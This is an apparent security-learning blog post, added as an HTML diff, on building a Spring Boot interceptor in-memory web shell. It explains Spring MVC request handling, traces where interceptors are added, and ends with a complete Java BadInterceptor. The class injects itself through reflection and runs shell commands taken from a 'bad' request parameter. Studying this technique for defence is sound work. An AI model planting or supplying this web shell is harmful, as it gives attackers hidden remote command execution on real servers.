@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            SpringBoot-Interceptor内存马 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        SpringBoot-Interceptor内存马
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv1</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-04 19:44:38</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sun May 04 2025 19:45:26 GMT+0800">2025-05-04 19:45:26</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>这里主要讲一下SpringBoot里的各种组件和它们的作用与关系。<br>首先需要知道什么是SpringMVC。MVC就是Model-View-Controller。SpringBoot中内置了SpringMVC，并帮助你把一些繁琐的配置做好了(不需要写web.xml)，使程序员只需要关注业务代码。<br>SpringMVC里有几个重要的部分，分别是DispatcherServlet，HandlerAdapter，Handler。下面简单介绍一下。<br>先看一张图，建立基本认识：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358136875-6a997a58-e40a-413b-ba9f-785c985b95c1.png"
+                       
+                 ></p>
+<p>下面的内容是我问AI的，还挺清楚，大家有什么不懂的也可以直接问AI。</p>
+<p>首先是HandlerAdapter和Handler：<br>在 Spring MVC 中，HandlerAdapter 和 Handler 是两个非常重要的概念，它们在请求处理过程中扮演着不同的角色。为了更好地理解它们的区别和作用，我们先分别解释一下这两个概念，然后再对比它们的不同之处。</p>
+<h2 id="Handler-HandlerAdapter"><a href="#Handler-HandlerAdapter" class="headerlink" title="Handler&amp;HandlerAdapter"></a>Handler&amp;HandlerAdapter</h2><hr>
+<h3 id="Handler（处理器）"><a href="#Handler（处理器）" class="headerlink" title="Handler（处理器）"></a>Handler（处理器）</h3><ul>
+<li>定义：Handler 是一个接口，表示能够处理 HTTP 请求的对象。它通常是控制器（Controller）的一个实例，负责处理特定的 URL 请求。</li>
+<li>功能：Handler 的主要职责是根据传入的请求参数执行相应的业务逻辑，并返回一个 ModelAndView 或其他类型的响应结果。</li>
+<li>实现方式：</li>
+<li>在 Spring MVC 中，最常见的是使用注解驱动的控制器（如 @Controller 或 @RestController），这些控制器类就是 Handler 的具体实现。</li>
+<li>除了注解驱动的方式，Spring MVC 还支持基于接口的控制器（如 Controller 接口），但这种方式已经较少使用。<br>示例：<br>@Controller<br>public class MyController {  @GetMapping(“&#x2F;hello”)<br>public String hello(Model model) {<br>model.addAttribute(“message”, “Hello, World!”);<br>return “hello”;  &#x2F;&#x2F; 返回视图名称<br>}</li>
+</ul>
+<p>}</p>
+<p>在这个例子中，MyController 就是一个 Handler，它处理 &#x2F;hello 路径的 GET 请求。</p>
+<hr>
+<h3 id="HandlerAdapter（处理器适配器）"><a href="#HandlerAdapter（处理器适配器）" class="headerlink" title="HandlerAdapter（处理器适配器）"></a>HandlerAdapter（处理器适配器）</h3><ul>
+<li>定义：HandlerAdapter 是一个接口，它的作用是将不同类型的 Handler 统一为一种标准的处理方式。它负责调用具体的 Handler 并处理请求。</li>
+<li>功能：HandlerAdapter 的主要职责是将请求交给合适的 Handler 处理，并将处理结果转换为 ModelAndView 或其他响应形式。它充当了框架与具体处理器之间的桥梁。</li>
+<li>实现方式：</li>
+<li>Spring MVC 内置了多种 HandlerAdapter 实现，用于处理不同类型的 Handler。例如：</li>
+<li>RequestMappingHandlerAdapter：用于处理基于注解的控制器（如 @Controller、@RestController）。</li>
+<li>SimpleControllerHandlerAdapter：用于处理实现了 Controller 接口的传统控制器。</li>
+<li>HttpRequestHandlerAdapter：用于处理实现了 HttpRequestHandler 接口的处理器。<br>示例：<br>@RequestMappingHandlerAdapter adapter &#x3D; new RequestMappingHandlerAdapter();<br>adapter.handle(request, response, handler);</li>
+</ul>
+<p>在这个例子中，RequestMappingHandlerAdapter 是一个 HandlerAdapter，它负责调用注解驱动的控制器来处理请求。</p>
+<hr>
+<h3 id="Handler-和-HandlerAdapter-的区别"><a href="#Handler-和-HandlerAdapter-的区别" class="headerlink" title="Handler 和 HandlerAdapter 的区别"></a>Handler 和 HandlerAdapter 的区别</h3><ul>
+<li>特性Handler（处理器）HandlerAdapter（处理器适配器）角色具体的请求处理者调用并适配不同的 Handler职责执行业务逻辑，处理请求将请求分发给合适的 Handler类型可以是注解驱动的控制器、命令对象等是一个适配器，负责统一处理流程数量可以有多个 Handler通常只有一个或少数几个 HandlerAdapter调用关系Handler 由 HandlerAdapter 调用HandlerAdapter 由 DispatcherServlet 调用</li>
+</ul>
+<hr>
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ul>
+<li>在 Spring MVC 中，请求的处理流程如下：<br>1.请求到达：用户发起 HTTP 请求，请求被发送到 DispatcherServlet。<br>2.查找 Handler：DispatcherServlet 使用 HandlerMapping 来查找匹配的 Handler。<br>3.调用 HandlerAdapter：找到合适的 Handler 后，DispatcherServlet 会使用 HandlerAdapter 来调用该 Handler。<br>4.处理请求：HandlerAdapter 调用具体的 Handler，执行业务逻辑。<br>5.返回结果：Handler 处理完请求后，返回一个 ModelAndView 或其他类型的响应结果。<br>6.渲染视图：DispatcherServlet 根据返回的结果选择合适的视图进行渲染，并将响应返回给客户端。</li>
+</ul>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>Handler 是实际处理请求的对象，通常是控制器类，负责执行业务逻辑。</li>
+<li>HandlerAdapter 是一个适配器，它负责将请求分发给合适的 Handler，并确保所有类型的 Handler 都能以统一的方式被调用。<br>简单来说，HandlerAdapter 是一个中间层，它使得 Spring MVC 可以灵活地支持多种类型的 Handler，而不需要改变核心的请求处理流程。</li>
+<li>DispatcherServlet<br>然后是DispatcherServlet：<br>DispatcherServlet 是 Spring MVC 框架中的核心组件，它是整个 Web 请求处理流程的前端控制器（Front Controller）。所有的 HTTP 请求都会通过 DispatcherServlet 进行分发和处理。它负责协调 Spring MVC 的各个组件，完成从请求到响应的整个生命周期管理。</li>
+</ul>
+<hr>
+<h2 id="DispatcherServlet-的作用"><a href="#DispatcherServlet-的作用" class="headerlink" title="DispatcherServlet 的作用"></a>DispatcherServlet 的作用</h2><h3 id="DispatcherServlet-的作用-1"><a href="#DispatcherServlet-的作用-1" class="headerlink" title="DispatcherServlet 的作用"></a><strong>DispatcherServlet 的作用</strong></h3><ul>
+<li><strong>统一入口</strong>：DispatcherServlet 是 Spring MVC 的前端控制器，所有的 HTTP 请求都会被转发到这里。</li>
+<li><strong>请求分发</strong>：根据请求的 URL 和配置，DispatcherServlet 负责将请求分发给合适的处理器（Handler）。</li>
+<li><strong>组件协作</strong>：DispatcherServlet 协调了 Spring MVC 中的多个组件（如 HandlerMapping、HandlerAdapter、ViewResolver 等），确保请求能够被正确处理并返回响应。</li>
+</ul>
+<hr>
+<h3 id="DispatcherServlet-的工作流程"><a href="#DispatcherServlet-的工作流程" class="headerlink" title="DispatcherServlet 的工作流程"></a>DispatcherServlet 的工作流程</h3><ul>
+<li>当一个 HTTP 请求到达时，DispatcherServlet 的主要工作流程如下：<br>1.接收请求：</li>
+<li>用户发起 HTTP 请求，请求被发送到 DispatcherServlet。<br>2.<strong>查找 Handler</strong>：</li>
+<li>DispatcherServlet 使用 HandlerMapping 来查找能够处理该请求的 Handler（处理器）。</li>
+<li>HandlerMapping 根据请求的 URL、HTTP 方法等信息，匹配到对应的 Handler。<br>3.<strong>调用 HandlerAdapter</strong>：</li>
+<li>找到合适的 Handler 后，DispatcherServlet 使用 HandlerAdapter 来调用该 Handler。</li>
+<li>HandlerAdapter 是一个适配器，负责调用不同类型的 Handler 并统一返回结果。<br>4.<strong>执行业务逻辑</strong>：</li>
+<li>Handler（通常是控制器类）执行具体的业务逻辑，并返回一个 ModelAndView 对象，其中包含模型数据和视图名称。<br>5.<strong>解析视图</strong>：</li>
+<li>DispatcherServlet 使用 ViewResolver 将视图名称解析为具体的视图对象（如 JSP、Thymeleaf 等）。<br>6.<strong>渲染视图</strong>：</li>
+<li>视图对象根据模型数据进行渲染，生成最终的 HTML 页面或其他形式的响应内容。<br>7.<strong>返回响应</strong>：</li>
+<li>渲染完成后，DispatcherServlet 将响应内容返回给客户端。</li>
+</ul>
+<hr>
+<h3 id="DispatcherServlet-的初始化"><a href="#DispatcherServlet-的初始化" class="headerlink" title="DispatcherServlet 的初始化"></a>DispatcherServlet 的初始化</h3><ul>
+<li>在应用程序启动时，DispatcherServlet 会被初始化。它的初始化过程包括以下几个步骤：<br>1.加载 WebApplicationContext：</li>
+<li>DispatcherServlet 会创建并加载一个独立的 Web 应用上下文（WebApplicationContext），用于存储与 Web 相关的 Bean。<br>2.<strong>注册组件</strong>：</li>
+<li>初始化过程中，DispatcherServlet 会注册一系列关键组件，例如：</li>
+<li>HandlerMapping：用于匹配请求和处理器。</li>
+<li>HandlerAdapter：用于调用处理器。</li>
+<li>ViewResolver：用于解析视图名称。</li>
+<li>其他组件（如异常处理器、拦截器等）。<br>3.<strong>准备就绪</strong>：</li>
+<li>初始化完成后，DispatcherServlet 准备好接收和处理 HTTP 请求。</li>
+</ul>
+<hr>
+<h3 id="DispatcherServlet-的配置"><a href="#DispatcherServlet-的配置" class="headerlink" title="DispatcherServlet 的配置"></a>DispatcherServlet 的配置</h3><p>在传统的 Spring MVC 项目中，DispatcherServlet 通常通过 web.xml 配置文件进行声明。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Spring Boot 中，DispatcherServlet 的配置被自动简化，开发者不需要手动编写 web.xml 文件。Spring Boot 会自动配置 DispatcherServlet 并将其映射到 &#x2F; 路径。</p>
+<h3 id="DispatcherServlet-的重要性"><a href="#DispatcherServlet-的重要性" class="headerlink" title="DispatcherServlet 的重要性"></a><strong>DispatcherServlet 的重要性</strong></h3><ul>
+<li><strong>单一入口</strong>：DispatcherServlet 是整个 Spring MVC 请求处理流程的起点，所有的请求都必须经过它。</li>
+<li><strong>解耦设计</strong>：通过 DispatcherServlet，Spring MVC 实现了请求处理的解耦设计，使得框架可以灵活扩展。</li>
+<li><strong>可扩展性</strong>：开发者可以通过自定义 HandlerMapping、HandlerAdapter 或 ViewResolver 等组件，来实现特定的需求。</li>
+</ul>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>DispatcherServlet 是 Spring MVC 的核心组件，作为前端控制器，它负责接收请求、分发请求、协调组件以及返回响应。它的存在使得 Spring MVC 的请求处理流程清晰且高效，同时提供了高度的灵活性和可扩展性。</p>
+<h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><p>这里我们做分析的目的，主要是为了知道哪里添加了Interceptor，调用了Interceptor的preHandle方法。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358785840-c2ce699e-437e-4331-b51a-c0b1efc3aff6.png"
+                       
+                 ></p>
+<p>如上图，直接在DispatcherServlet#doDispatch断点。箭头所指处， 就是开头那张图片的第一步，请求查询Handler，我们跟进。<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358797905-f93bb9a5-a7b5-4b85-a74a-755d69df0334.png"
+                       
+                 ></p>
+<p>继续跟进上图中的getHandler。<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358813125-60324f40-f8ba-4aca-944e-aae4d60f7977.png"
+                       
+                 ></p>
+<p>来到了AbstractHandlerMapping，我们继续跟进getHandlerExecutionChain。<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358823706-2d8672fa-76fe-4150-90bd-697a6082f21c.png"
+                       
+                 ></p>
+<p>这里就是add Interceptor的地方了。这下我们的目标其实也明确了。通过反射拿到AbstractHandlerMapping的adaptedInterceptor属性，向这个属性里添加我们的interceptor。那么怎么拿到当前代码环境下的，也就是当前上下文里的AbstractHandlerMapping呢？通过获取WebApplicationContext可以做到。<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358836638-2789b405-7a62-43d1-8af9-7401db99ff1d.png"
+                       
+                 ></p>
+<p>如上图，回到doDispatch，这里的mappedHandler就是一开始图片里的HandlerExectionChain。这里面包括两个interceptors和处理这个http请求需要用到的controller方法。<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1746358847454-b104a7bc-2f04-4264-822a-bf742937c91d.png"
+                       
+                 ></p>
+<p>如上图，第一个箭头拿HandlerAdapter，第二个调用Interceptor中的preHandle方法，第三个就是调用controller中的对应方法。这里不讲了，可以自己跟进看一下。</p>
+<p>下面这段可以作为反序列化sink的字节码动态加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">//作为反序列化sink动态加载的字节码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BadInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获得context</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//获取 adaptedInterceptors 属性值</span></span><br><span class="line">            org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line">            <span class="type">BadInterceptor</span> <span class="variable">aaa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadInterceptor</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">            adaptedInterceptors.add(aaa);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BadInterceptor</span><span class="params">(String aaaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;bad&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(code != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, code&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, code&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                SpringBoot-Interceptor内存马
+            </div>
+
